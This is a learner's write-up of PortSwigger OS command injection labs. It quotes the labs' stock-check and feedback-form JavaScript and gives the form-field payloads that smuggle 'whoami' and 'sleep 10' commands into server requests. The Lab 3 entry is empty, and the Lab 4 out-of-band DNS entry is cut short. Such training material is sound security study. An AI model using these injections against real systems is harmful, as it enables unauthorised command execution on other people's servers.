# OS command injection

Get detail at [here](https://portswigger.net/web-security/os-command-injection)

---

[Lab 1](https://portswigger.net/web-security/os-command-injection/lab-simple)

Description of this lab: execute the whoami command to determine the name of the current user

Check the source code, we can see in js folder having 2 file:

 - stockCheckPayload.js
    ```js
        window.contentType = 'application/x-www-form-urlencoded';

        function payload(data) {
            return new URLSearchParams(data).toString();
        }
    ```

 - stockCheck.js
    ```js
        document.getElementById("stockCheckForm").addEventListener("submit", function(e) {
            checkStock(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
            e.preventDefault();
        });

        function checkStock(method, path, data) {
            const retry = (tries) => tries == 0
            ? null
            : fetch(
                path,
                    {
                        method,
                        headers: { 'Content-Type': window.contentType },
                        body: payload(data)
                    }
            )
            .then(res => res.status === 200
                ? res.text().then(t => isNaN(t) ? t : t + " units")
                : "Could not fetch stock levels!"
            )
            .then(res => document.getElementById("stockCheckResult").innerHTML = res)
            .catch(e => retry(tries - 1));

            retry(3);
        }
    ```

Morever input (variable data) which is sent to server has no validate. Using burp suite to see what happen when clicking on button `Check stock`, website will send payload like this `productId=1&storeId=1` to server, and response of server is a number. Try to expand payload with some basic os command injection. The final payload is `productId=1;whoami&storeId=1`, using repeater to send this to server and solved the lab.

[Lab 2](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

Description of this lab: exploit the blind OS command injection vulnerability to cause a 10 second delay

This lab contains feedback form, using burp suite to inspect when fill in form. After we submit form, website will send payload like this `csrf=QaxMCM25M0zUFiWZNvIOEfUkTjeLK3tm&name=demo&email=demo%40demo.demo&subject=demo&message=demo%0A` to server. Check at code, and we can found this code processing data to server. 

submitFeedback.js
```js
    document.getElementById("feedbackForm").addEventListener("submit", function(e) {
        submitFeedback(this.getAttribute("method"), this.getAttribute("action"), this.getAttribute("enctype"), this.getAttribute("personal"), new FormData(this));
        e.preventDefault();
    });

    function submitFeedback(method, path, encoding, personal, data) {
        var XHR = new XMLHttpRequest();
        XHR.open(method, path);
        if (personal) {
            XHR.addEventListener("load", displayFeedbackMessage(data.get('name')));
        } else {
            XHR.addEventListener("load", displayFeedbackMessage());
        }
        if (encoding === "multipart/form-data") {
            XHR.send(data)
        } else {
            var params = new URLSearchParams(data);
            XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            XHR.send(params.toString())
        }
    }

    function displayFeedbackMessage(name) {
        return function() {
            var feedbackResult = document.getElementById("feedbackResult");
            if (this.status === 200) {
                feedbackResult.innerHTML = "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
                feedbackForm.reset();
            } else {
                feedbackResult.innerHTML =  "Failed to submit feedback: " + this.responseText
            }
        }
    }
```

We can exploit input with command `sleep 10` to delay 10 seconds, modify payload like this `name=demo&email=demo%40demo.demo;sleep+10;&subject=demo&message=demo%0A`, if using only one `;` like previous lab, this exploit can't work correctly, so we need to add more beacause it has something at the back. Sending this payload with burp repeater and solved the lab.


[Lab 3](#)

[Lab 4](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

Description of this lab: exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator

Do the same as lab 2. Firstly, using this command `nslookup` to look up DNS, get address of Burp Collaborator
